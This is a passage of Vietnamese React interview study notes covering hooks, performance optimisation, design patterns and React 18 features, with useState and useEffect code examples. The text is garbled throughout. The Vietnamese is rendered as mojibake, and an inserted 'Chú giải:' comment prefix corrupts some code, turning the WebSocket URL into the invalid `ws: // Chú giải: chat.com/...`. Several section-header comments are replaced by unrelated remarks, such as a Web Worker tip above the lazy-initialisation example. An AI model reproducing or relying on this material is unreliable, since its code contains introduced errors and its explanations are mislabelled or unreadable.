- **Ki·∫øn tr√∫c Fiber**: Rendering tƒÉng d·∫ßn ‚Üí t·∫°m d·ª´ng/ti·∫øp t·ª•c c√¥ng vi·ªác ‚Üí hi·ªáu nƒÉng c·∫£m nh·∫≠n t·ªët h∆°n.

**üöÄ T·ªëi ∆Øu Hi·ªáu NƒÉng:**
1. **React.memo()**: So s√°nh n√¥ng props ‚Üí b·ªè qua render l·∫°i n·∫øu props kh√¥ng ƒë·ªïi.
2. **useMemo()**: Cache t√≠nh to√°n n·∫∑ng ‚Üí tr√°nh t√≠nh l·∫°i m·ªói l·∫ßn render.
3. **useCallback()**: Cache tham chi·∫øu h√†m ‚Üí ngƒÉn component con render l·∫°i.
4. **Chia Code**: `React.lazy()` + Suspense ‚Üí t·∫£i components theo y√™u c·∫ßu.
5. **·∫¢o h√≥a**: `react-window` cho danh s√°ch d√†i ‚Üí ch·ªâ render items hi·ªÉn th·ªã.
6. **Tr√°nh h√†m/object inline**: T·∫°o tham chi·∫øu m·ªõi m·ªói l·∫ßn render ‚Üí con render l·∫°i.

**üé® M·∫´u Thi·∫øt K·∫ø N√¢ng Cao:**
- **HOC (Component B·∫≠c Cao)**: B·ªçc component ƒë·ªÉ inject props. V√≠ d·ª•: `withAuth(Component)`.
- **Render Props**: Truy·ªÅn h√†m l√†m children. V√≠ d·ª•: `<DataProvider>{data => <List data={data} />}</DataProvider>`.
- **Compound Components**: C√°c component giao ti·∫øp qua Context. V√≠ d·ª©: `<Tabs><Tab /></Tabs>`.
- **Custom Hooks**: Tr√≠ch xu·∫•t logic t√°i s·ª≠ d·ª•ng. B·∫Øt ƒë·∫ßu b·∫±ng `use`. Tr·∫£ v·ªÅ state/functions.

**‚ö° T√≠nh NƒÉng React 18+:**
1. **Concurrent Rendering**: Render c√≥ th·ªÉ ng·∫Øt ‚Üí UI ph·∫£n h·ªìi trong khi c·∫≠p nh·∫≠t n·∫∑ng.
2. **useTransition()**: ƒê√°nh d·∫•u c·∫≠p nh·∫≠t kh√¥ng kh·∫©n c·∫•p ‚Üí gi·ªØ UI ph·∫£n h·ªìi.
3. **useDeferredValue()**: Tr√¨ ho√£n render n·∫∑ng ‚Üí debouncing t√≠ch h·ª£p s·∫µn.
4. **Suspense cho Data Fetching**: Tr·∫°ng th√°i loading khai b√°o.
5. **Server Components**: Render tr√™n server ‚Üí kh√¥ng c√≥ JS bundle cho component ƒë√≥.
6. **Batching T·ª± ƒê·ªông**: G·ªôp nhi·ªÅu setState ‚Üí 1 l·∫ßn render (k·ªÉ c·∫£ trong async).

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- **Thi·∫øu dependencies trong useEffect**: ESLint c·∫£nh b√°o ‚Üí s·ª≠a ho·∫∑c v√¥ hi·ªáu n·∫øu c·ªë √Ω.
- **V√≤ng l·∫∑p v√¥ h·∫°n**: useEffect kh√¥ng c√≥ deps array + setState b√™n trong ‚Üí render v√¥ h·∫°n.
- **L·∫°m d·ª•ng useMemo/useCallback**: T·ªëi ∆∞u s·ªõm ‚Üí ch·ªâ d√πng khi ƒëo ƒë∆∞·ª£c v·∫•n ƒë·ªÅ hi·ªáu nƒÉng.
- **Thay ƒë·ªïi state tr·ª±c ti·∫øp**: `state.value = 1` ‚Üí React kh√¥ng ph√°t hi·ªán ‚Üí d√πng `setState`.

**üí° Ki·∫øn Th·ª©c Senior:**
- **useEffect vs useLayoutEffect**: useLayoutEffect ch·∫°y ƒë·ªìng b·ªô sau render, TR∆Ø·ªöC tr√¨nh duy·ªát v·∫Ω ‚Üí d√πng khi c·∫ßn ƒëo DOM.
- **StrictMode**: G·ªçi effects 2 l·∫ßn trong dev ‚Üí b·∫Øt l·ªói side effects s·ªõm.
- **Profiler**: Component `<Profiler>` + DevTools ‚Üí ƒëo hi·ªáu nƒÉng render.
- **Batching**: React 18 t·ª± ƒë·ªông g·ªôp m·ªçi c·∫≠p nh·∫≠t (k·ªÉ c·∫£ setTimeout, promises) ‚Üí √≠t render h∆°n.
- **Keys trong Reconciliation**: Key thay ƒë·ªïi ‚Üí unmount component c≈© + mount m·ªõi ‚Üí reset state.

---

**Tr·∫£ l·ªùi:**

C√¢u h·ªèi n√†y bao g·ªìm t·∫•t c·∫£ ki·∫øn th·ª©c quan tr·ªçng v·ªÅ React t·ª´ c∆° b·∫£n ƒë·∫øn n√¢ng cao, bao g·ªìm:
- T·∫•t c·∫£ React Hooks (useState, useEffect, useRef, useReducer, useContext, useMemo, useCallback, useLayoutEffect, useImperativeHandle, useSyncExternalStore)
- Lifecycle c·ªßa Class Component vs Functional Component
- Virtual DOM, Reconciliation, key trong lists
- Performance optimization (React.memo, PureComponent)
- Advanced patterns (HOC, Render Props, Compound Components)
- React 18+ features (Suspense, Server Components, Concurrent Rendering, useTransition, useDeferredValue)
- React Router, Portal, Batching, Code Splitting

#### **üìö PH·∫¶N 1: REACT HOOKS - T·∫§T C·∫¢ C√ÅC HOOK C∆† B·∫¢N & N√ÇNG CAO**

---

##### **1.1. useState - State Management Hook**

**üéØ M·ª•c ƒë√≠ch:**
Qu·∫£n l√Ω state trong functional component (tr∆∞·ªõc ƒë√¢y ch·ªâ c√≥ class component m·ªõi c√≥ state).

**üìñ C√°ch ho·∫°t ƒë·ªông:**
```typescript
const [state, setState] = useState(initialValue);

// C√°ch ho·∫°t ƒë·ªông b√™n trong React:
// 1. L·∫ßn render ƒë·∫ßu ti√™n: React t·∫°o m·ªôt "fiber node" cho component
// 2. useState t·∫°o m·ªôt "hook object" v·ªõi gi√° tr·ªã initial
// 3. Hook object ƒë∆∞·ª£c l∆∞u trong linked list tr√™n fiber node
// 4. setState trigger re-render b·∫±ng c√°ch ƒë√°nh d·∫•u fiber "dirty"
// 5. Reconciliation: React so s√°nh old state vs new state
// 6. N·∫øu kh√°c (Object.is comparison) ‚Üí re-render component
```

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC USAGE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Counter() {
  const [count, setCount] = useState(0); // Ch√∫ gi·∫£i: Primitive state
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: FUNCTIONAL UPDATES (Quan tr·ªçng cho async updates)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Counter() {
  const [count, setCount] = useState(0);
  
  // ‚ùå Sai: C√≥ th·ªÉ b·ªã stale closure khi g·ªçi nhi·ªÅu l·∫ßn
  const handleClick = () => {
    setCount(count + 1);
    setCount(count + 1); // Ch·ªâ tƒÉng 1 l·∫ßn v√¨ count c≈©!
  };
  
  // ‚úÖ ƒê√∫ng: Lu√¥n d√πng gi√° tr·ªã m·ªõi nh·∫•t
  const handleClickCorrect = () => {
    setCount(prev => prev + 1);
    setCount(prev => prev + 1); // TƒÉng 2 l·∫ßn ƒë√∫ng!
  };
  
  return <button onClick={handleClickCorrect}>Increment Twice</button>;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function ExpensiveComponent() {
 // Ch√∫ gi·∫£i: ‚ùå Sai: Ch·∫°y expensive function m·ªói l·∫ßn re-render
  const [data, setData] = useState(expensiveComputation());
  
  // ‚úÖ ƒê√∫ng: Ch·ªâ ch·∫°y 1 l·∫ßn khi mount
  const [data, setData] = useState(() => expensiveComputation());
  
  return <div>{data}</div>;
}

function expensiveComputation() {
  console.log('Computing...'); // Ch√∫ gi·∫£i: Ch·ªâ log 1 l·∫ßn v·ªõi lazy init
  let result = 0;
  for (let i = 0; i < 1000000; i++) {
    result += i;
  }
  return result;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function UserForm() {
  const [user, setUser] = useState({
    name: '',
    email: '',
    address: { city: '', street: '' }
  });
  
  // ‚ùå Sai: Mutate tr·ª±c ti·∫øp (React kh√¥ng detect change)
  const handleChangeBad = (e) => {
    user.name = e.target.value; // Ch√∫ gi·∫£i: Mutation!
    setUser(user); // React kh√¥ng re-render v√¨ c√πng reference
  };
  
  // ‚úÖ ƒê√∫ng: T·∫°o object m·ªõi (immutable update)
  const handleChange = (e) => {
    setUser(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };
  
 // Ch√∫ gi·∫£i: ‚úÖ Nested object update
  const handleAddressChange = (field, value) => {
    setUser(prev => ({
      ...prev,
      address: {
        ...prev.address,
        [field]: value
      }
    }));
  };
  
  return (
    <form>
      <input name="name" onChange={handleChange} />
      <input name="email" onChange={handleChange} />
      <input 
        name="city" 
        onChange={(e) => handleAddressChange('city', e.target.value)} 
      />
    </form>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ARRAY STATE OPERATIONS
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function TodoList() {
  const [todos, setTodos] = useState([
    { id: 1, text: 'Learn React', done: false }
  ]);
  
  // Th√™m item
  const addTodo = (text) => {
    setTodos(prev => [...prev, { id: Date.now(), text, done: false }]);
  };
  
  // X√≥a item
  const removeTodo = (id) => {
    setTodos(prev => prev.filter(todo => todo.id !== id));
  };
  
 // Ch√∫ gi·∫£i: Update item
  const toggleTodo = (id) => {
    setTodos(prev => prev.map(todo => 
      todo.id === id ? { ...todo, done: !todo.done } : todo
    ));
  };
  
 // Ch√∫ gi·∫£i: Insert at position
  const insertAt = (index, text) => {
    setTodos(prev => [
      ...prev.slice(0, index),
      { id: Date.now(), text, done: false },
      ...prev.slice(index)
    ]);
  };
  
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          <input 
            type="checkbox" 
            checked={todo.done}
            onChange={() => toggleTodo(todo.id)}
          />
          {todo.text}
          <button onClick={() => removeTodo(todo.id)}>Delete</button>
        </li>
      ))}
    </ul>
  );
}
```

**‚ö†Ô∏è Common Mistakes:**

```typescript
// ‚ùå 1. Kh√¥ng d√πng functional update khi c·∫ßn previous state
const [count, setCount] = useState(0);
setCount(count + 1); // Ch√∫ gi·∫£i: Stale closure issue

 // Ch√∫ gi·∫£i: ‚úÖ Fix
setCount(prev => prev + 1);

// ‚ùå 2. Mutate state tr·ª±c ti·∫øp
const [arr, setArr] = useState([1, 2, 3]);
arr.push(4); // Ch√∫ gi·∫£i: Mutation!
setArr(arr); // Kh√¥ng re-render

 // Ch√∫ gi·∫£i: ‚úÖ Fix
setArr(prev => [...prev, 4]);

 // Ch√∫ gi·∫£i: ‚ùå 3. Set state trong render (infinite loop)
function Component() {
  const [count, setCount] = useState(0);
  setCount(1); // Ch√∫ gi·∫£i: ‚ùå Infinite loop!
  return <div>{count}</div>;
}

// ‚úÖ Fix: Set state trong event handler ho·∫∑c useEffect
useEffect(() => {
  setCount(1);
}, []);
```

---

##### **1.2. useEffect - Side Effects Hook**

**üéØ M·ª•c ƒë√≠ch:**
X·ª≠ l√Ω side effects (API calls, subscriptions, DOM manipulation, timers) trong functional components.

**üìñ C√°ch ho·∫°t ƒë·ªông:**
```typescript
useEffect(() => {
 // Ch√∫ gi·∫£i: Effect function (ch·∫°y sau render)
  return () => {
    // Cleanup function (ch·∫°y tr∆∞·ªõc khi component unmount ho·∫∑c effect re-run)
  };
}, [dependencies]); // Ch√∫ gi·∫£i: Dependency array

 // Ch√∫ gi·∫£i: Timeline:
 // Ch√∫ gi·∫£i: 1. Component render (JSX ‚Üí Virtual DOM)
 // Ch√∫ gi·∫£i: 2. React commit changes to real DOM
 // Ch√∫ gi·∫£i: 3. Browser paint screen
// 4. useEffect callback ch·∫°y (AFTER paint - kh√¥ng block UI)
// 5. Khi dependencies thay ƒë·ªïi:
 // Ch√∫ gi·∫£i: - Cleanup function ch·∫°y tr∆∞·ªõc
 // Ch√∫ gi·∫£i: - Effect function ch·∫°y l·∫°i
// 6. Khi component unmount: Cleanup ch·∫°y cu·ªëi c√πng
```

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// useEffect COVERS C√ÅC LIFECYCLE N√ÄO?
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: Class component lifecycle:
class ClassComponent extends React.Component {
  componentDidMount() {
 // Ch√∫ gi·∫£i: Ch·∫°y 1 l·∫ßn sau mount
  }
  
  componentDidUpdate(prevProps, prevState) {
    // Ch·∫°y m·ªói khi props/state thay ƒë·ªïi
  }
  
  componentWillUnmount() {
 // Ch√∫ gi·∫£i: Cleanup tr∆∞·ªõc khi unmount
  }
}

 // Ch√∫ gi·∫£i: Functional component equivalent:
function FunctionalComponent() {
 // Ch√∫ gi·∫£i: ‚úÖ componentDidMount + componentWillUnmount
  useEffect(() => {
    console.log('Mounted');
    return () => console.log('Unmounted'); // Ch√∫ gi·∫£i: cleanup
  }, []); // Ch√∫ gi·∫£i: Empty deps = ch·ªâ ch·∫°y 1 l·∫ßn
  
  // ‚úÖ componentDidUpdate (khi count thay ƒë·ªïi)
  useEffect(() => {
    console.log('Count changed:', count);
  }, [count]); // Ch·∫°y khi count thay ƒë·ªïi
  
 // Ch√∫ gi·∫£i: ‚úÖ componentDidMount + componentDidUpdate (m·ªói l·∫ßn render)
  useEffect(() => {
    console.log('Every render');
  }); // Ch√∫ gi·∫£i: No deps = ch·∫°y m·ªói l·∫ßn render
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: DEPENDENCY ARRAY RULES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Example({ userId }) {
  const [user, setUser] = useState(null);
  
 // Ch√∫ gi·∫£i: ‚ùå Sai: Missing dependency
  useEffect(() => {
    fetchUser(userId).then(setUser); // userId kh√¥ng c√≥ trong deps!
  }, []); // ESLint s·∫Ω warning
  
  // ‚úÖ ƒê√∫ng: Include all dependencies
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, [userId]); // Re-fetch khi userId thay ƒë·ªïi
  
  // ‚úÖ Ignore ESLint (n·∫øu ch·∫Øc ch·∫Øn kh√¥ng c·∫ßn)
  useEffect(() => {
    fetchUser(userId).then(setUser);
 // Ch√∫ gi·∫£i: eslint-disable-next-line react-hooks/exhaustive-deps
  }, []); // Ch·ªâ fetch 1 l·∫ßn (nh∆∞ng c√≥ th·ªÉ stale)
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// CLEANUP FUNCTION - KHI N√ÄO CH·∫†Y?
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Timer() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    console.log('Effect running');
    const timer = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
    
 // Ch√∫ gi·∫£i: Cleanup ch·∫°y khi:
 // Ch√∫ gi·∫£i: 1. Component unmount
    // 2. Tr∆∞·ªõc khi effect ch·∫°y l·∫°i (n·∫øu deps thay ƒë·ªïi)
    return () => {
      console.log('Cleanup running');
      clearInterval(timer); // ‚ö†Ô∏è Quan tr·ªçng: tr√°nh memory leak!
    };
  }, []); // Ch√∫ gi·∫£i: Empty deps = cleanup ch·ªâ ch·∫°y khi unmount
  
  return <div>{count}</div>;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: REAL-WORLD EXAMPLES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: 1. Data Fetching
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    let cancelled = false; // Ch√∫ gi·∫£i: Prevent setting state on unmounted component
    
    const fetchUser = async () => {
      try {
        setLoading(true);
        setError(null);
        const response = await fetch(`/api/users/${userId}`);
        const data = await response.json();
        
        if (!cancelled) {
          setUser(data);
        }
      } catch (err) {
        if (!cancelled) {
          setError(err.message);
        }
      } finally {
        if (!cancelled) {
          setLoading(false);
        }
      }
    };
    
    fetchUser();
    
    return () => {
      cancelled = true; // Ch√∫ gi·∫£i: Cleanup: mark as cancelled
    };
  }, [userId]);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  return <div>{user?.name}</div>;
}

 // Ch√∫ gi·∫£i: 2. Event Listeners
function WindowSize() {
  const [size, setSize] = useState({ width: 0, height: 0 });
  
  useEffect(() => {
    const handleResize = () => {
      setSize({
        width: window.innerWidth,
        height: window.innerHeight
      });
    };
    
 // Ch√∫ gi·∫£i: Add listener
    window.addEventListener('resize', handleResize);
    handleResize(); // Ch√∫ gi·∫£i: Set initial size
    
 // Ch√∫ gi·∫£i: Cleanup: Remove listener
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []); // Ch√∫ gi·∫£i: No deps = setup once
  
  return <div>{size.width} x {size.height}</div>;
}

 // Ch√∫ gi·∫£i: 3. Subscriptions (WebSocket, EventEmitter)
function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([]);
  
  useEffect(() => {
    const socket = new WebSocket(`ws: // Ch√∫ gi·∫£i: chat.com/${roomId}`);
    
    socket.onmessage = (event) => {
      setMessages(prev => [...prev, JSON.parse(event.data)]);
    };
    
 // Ch√∫ gi·∫£i: Cleanup: Close connection
    return () => {
      socket.close();
    };
  }, [roomId]); // Re-connect khi ƒë·ªïi room
  
  return (
    <ul>
      {messages.map((msg, i) => <li key={i}>{msg.text}</li>)}
    </ul>
  );
}

 // Ch√∫ gi·∫£i: 4. Document Title
function PageTitle({ title }) {
  useEffect(() => {
    const prevTitle = document.title;
    document.title = title;
    
    return () => {
      document.title = prevTitle; // Ch√∫ gi·∫£i: Restore
    };
  }, [title]);
}

 // Ch√∫ gi·∫£i: 5. Local Storage Sync
function useSyncWithLocalStorage(key, value) {
  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);
}

function Settings() {
  const [theme, setTheme] = useState('light');
  useSyncWithLocalStorage('theme', theme);
  
  return <button onClick={() => setTheme('dark')}>Dark Mode</button>;
}
```

**‚ö†Ô∏è Common Mistakes:**

```typescript
// ‚ùå 1. Kh√¥ng cleanup subscriptions/timers
useEffect(() => {
  const timer = setInterval(() => {}, 1000);
 // Ch√∫ gi·∫£i: ‚ùå Missing cleanup ‚Üí memory leak
}, []);

 // Ch√∫ gi·∫£i: ‚úÖ Fix
useEffect(() => {
  const timer = setInterval(() => {}, 1000);
  return () => clearInterval(timer);
}, []);

// ‚ùå 2. Infinite loop (missing deps ho·∫∑c deps sai)
useEffect(() => {
  setCount(count + 1); // ‚ùå count thay ƒë·ªïi ‚Üí effect ch·∫°y l·∫°i ‚Üí count thay ƒë·ªïi...
}, [count]);

// ‚úÖ Fix: Kh√¥ng set state c·ªßa ch√≠nh dependency
useEffect(() => {
  // Fetch data based on count, kh√¥ng set count
}, [count]);

// ‚ùå 3. Async function tr·ª±c ti·∫øp trong useEffect
